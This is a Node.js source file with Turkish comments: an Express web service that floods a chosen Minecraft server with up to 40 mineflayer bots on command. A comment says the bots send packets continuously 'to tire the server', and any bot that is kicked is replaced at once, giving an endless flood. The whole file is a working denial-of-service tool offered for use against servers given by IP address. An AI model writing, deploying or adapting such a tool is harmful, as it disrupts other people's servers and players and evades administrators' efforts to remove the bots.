const mineflayer = require('mineflayer');
const express = require('express');
const app = express();
app.use(express.json());
app.use(require('cors')());

let bots = [];
let isTargeting = false;

function createInfiniteBot(host, port) {
    if (!isTargeting) return;

    const botName = `Trigger_${Math.floor(Math.random() * 999999)}`;
    const bot = mineflayer.createBot({
        host: host,
        port: port,
        username: botName,
        version: "1.20.1",
        checkTimeoutInterval: 30000
    });

    bot.on('spawn', () => {
        console.log(`[+] ${botName} sahaya indi!`);
        // Sunucuyu yormak için sürekli paket gönderimi
        setInterval(() => {
            if (bot.entity) {
                bot.setControlState('jump', true);
                bot.look(Math.random() * 360, Math.random() * 90);
                setTimeout(() => bot.setControlState('jump', false), 100);
            }
        }, 1000);
    });

    // Bot sunucudan atılırsa veya hata verirse HEMEN YENİSİNİ GÖNDER
    bot.on('end', () => {
        console.log(`[-] ${botName} düştü, yenisi hazırlanıyor...`);
        if (isTargeting) setTimeout(() => createInfiniteBot(host, port), 2000);
    });

    bot.on('error', (err) => {
        console.log(`[!] Hata: ${err.message}`);
    });

    bots.push(bot);
}

app.post('/deploy', (req, res) => {
    const { ip, count } = req.body;
    const [host, port] = ip.split(':');
    isTargeting = true;
    
    // Belirlediğin sayı kadar botu döngüye sokar
    for (let i = 0; i < Math.min(count, 40); i++) {
        setTimeout(() => createInfiniteBot(host, parseInt(port) || 25565), i * 1000);
    }
    res.json({ message: "Sonsuz Bot Akını Başlatıldı! 🚀" });
});

app.post('/stop', (req, res) => {
    isTargeting = false;
    bots.forEach(b => b.quit());
    bots = [];
    res.json({ message: "Tüm botlar geri çekildi." });
});

app.listen(process.env.PORT || 3000, () => console.log("VIP Motor Fişek Gibi Aktif!"));
